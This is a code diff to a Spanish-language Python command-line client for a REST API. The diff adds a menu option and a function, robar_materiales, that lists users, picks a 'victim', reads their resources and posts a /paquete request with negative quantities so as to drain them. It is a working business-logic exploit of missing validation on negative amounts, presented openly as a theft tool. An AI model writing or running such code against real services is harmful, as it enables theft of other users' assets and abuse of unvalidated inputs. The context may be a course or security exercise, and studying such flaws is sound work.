@@ -11,11 +11,12 @@ def mostrar_menu():
     print("1. GET /info - Obtener información general")
     print("2. GET /gente - Obtener lista de personas")
     print("3. GET /info/{usuario} - Ver materiales de un usuario")
-    print("4. POST /alias/{nombre} - Añadir un alias")
-    print("5. DELETE /alias/{nombre} - Eliminar un alias")
-    print("6. POST /carta - Enviar una carta")
-    print("7. POST /paquete - Enviar un paquete")
-    print("8. DELETE /mail/{uid} - Eliminar un mail")
+    print("4. Robar materiales de un usuario")
+    print("5. POST /alias/{nombre} - Añadir un alias")
+    print("6. DELETE /alias/{nombre} - Eliminar un alias")
+    print("7. POST /carta - Enviar una carta")
+    print("8. POST /paquete - Enviar un paquete")
+    print("9. DELETE /mail/{uid} - Eliminar un mail")
     print("0. Salir")
     print("="*60)
 
@@ -116,6 +117,121 @@ def get_user_info():
             print("Detalle:", response.json())
         else:
             print(f"✗ Error {response.status_code}: {response.text}")
+    
+    except requests.exceptions.RequestException as e:
+        print(f"✗ Error de conexión: {e}")
+
+def robar_materiales():
+    """Ver materiales de un usuario y robarlos enviando un paquete con cantidades negativas"""
+    # Primero obtenemos la lista de usuarios
+    url_gente = f"{BASE_URL}/gente"
+    try:
+        response_gente = requests.get(url_gente)
+        if response_gente.status_code != 200:
+            print(f"✗ Error al obtener lista de usuarios: {response_gente.status_code}")
+            return
+        
+        usuarios = response_gente.json()
+        print("\n--- Usuarios disponibles ---")
+        for i, usuario in enumerate(usuarios, 1):
+            print(f"{i}. {usuario}")
+        
+        # Pedimos al usuario que seleccione
+        victima = input("\nIntroduce el nombre del usuario a robar: ").strip()
+        if not victima:
+            print("✗ El nombre de usuario no puede estar vacío")
+            return
+        
+        # Obtenemos información del usuario objetivo
+        url_info = f"{BASE_URL}/info/{victima}"
+        response_info = requests.get(url_info)
+        
+        if response_info.status_code == 200:
+            data = response_info.json()
+            print(f"\n Recursos disponibles de '{victima}':")
+            
+            if "Recursos" in data and data["Recursos"]:
+                recursos = data["Recursos"]
+                recursos_list = list(recursos.items())
+                
+                for i, (recurso, cantidad) in enumerate(recursos_list, 1):
+                    print(f"{i}. {recurso}: {cantidad}")
+                
+                print("\n--- Selecciona qué robar ---")
+                recursos_robar = {}
+                
+                while True:
+                    print("\nOpciones:")
+                    print("1. Robar un recurso específico")
+                    print("2. Robar TODOS los recursos")
+                    print("3. Finalizar y enviar paquete")
+                    print("0. Cancelar")
+                    
+                    opcion = input("\nSelecciona una opción: ").strip()
+                    
+                    if opcion == "1":
+                        # Robar recurso específico
+                        recurso_nombre = input("\nNombre del recurso a robar: ").strip()
+                        if recurso_nombre in recursos:
+                            try:
+                                cantidad_max = recursos[recurso_nombre]
+                                print(f"Cantidad disponible: {cantidad_max}")
+                                cantidad = int(input(f"Cantidad a robar (máximo {cantidad_max}): ").strip())
+                                
+                                if cantidad > 0 and cantidad <= cantidad_max:
+                                    recursos_robar[recurso_nombre] = -cantidad  # Negativo para robar
+                                    print(f"✓ Añadido: robar {cantidad} de {recurso_nombre}")
+                                else:
+                                    print(f"✗ Cantidad inválida. Debe ser entre 1 y {cantidad_max}")
+                            except ValueError:
+                                print("✗ La cantidad debe ser un número entero")
+                        else:
+                            print(f"✗ El recurso '{recurso_nombre}' no existe o no está disponible")
+                    
+                    elif opcion == "2":
+                        # Robar todos los recursos
+                        for recurso, cantidad in recursos.items():
+                            if cantidad > 0:
+                                recursos_robar[recurso] = -cantidad
+                        print(f"✓ Preparado para robar TODOS los recursos: {recursos_robar}")
+                    
+                    elif opcion == "3":
+                        # Enviar paquete
+                        if not recursos_robar:
+                            print("✗ No has seleccionado ningún recurso para robar")
+                            continue
+                        
+                        print(f"\n Enviando paquete de robo a '{victima}'...")
+                        print(f"Recursos: {recursos_robar}")
+                        
+                        url_paquete = f"{BASE_URL}/paquete"
+                        params = {"dest": victima}
+                        
+                        response_paquete = requests.post(url_paquete, params=params, json=recursos_robar)
+                        
+                        if response_paquete.status_code == 200:
+                            print("\n✓ ¡Robo exitoso!")
+                            print("Respuesta:", response_paquete.json())
+                        elif response_paquete.status_code == 422:
+                            print(f"\n✗ Error de validación (422)")
+                            print("Detalle:", response_paquete.json())
+                        else:
+                            print(f"\n✗ Error {response_paquete.status_code}: {response_paquete.text}")
+                        
+                        return
+                    
+                    elif opcion == "0":
+                        print("Operación cancelada")
+                        return
+                    else:
+                        print("✗ Opción no válida")
+            else:
+                print("✗ Este usuario no tiene recursos para robar")
+        
+        elif response_info.status_code == 404:
+            print(f"✗ Usuario '{victima}' no encontrado")
+        else:
+            print(f"✗ Error {response_info.status_code}: {response_info.text}")
     
     except requests.exceptions.RequestException as e:
         print(f"✗ Error de conexión: {e}")
@@ -273,14 +389,16 @@ def main():
         elif opcion == "3":
             get_user_info()
         elif opcion == "4":
-            add_alias()
+            robar_materiales()
         elif opcion == "5":
-            delete_alias()
+            add_alias()
         elif opcion == "6":
-            send_carta()
+            delete_alias()
         elif opcion == "7":
-            send_paquete()
+            send_carta()
         elif opcion == "8":
+            send_paquete()
+        elif opcion == "9":
             delete_mail()
         elif opcion == "0":
             print("\n¡Hasta luego!")
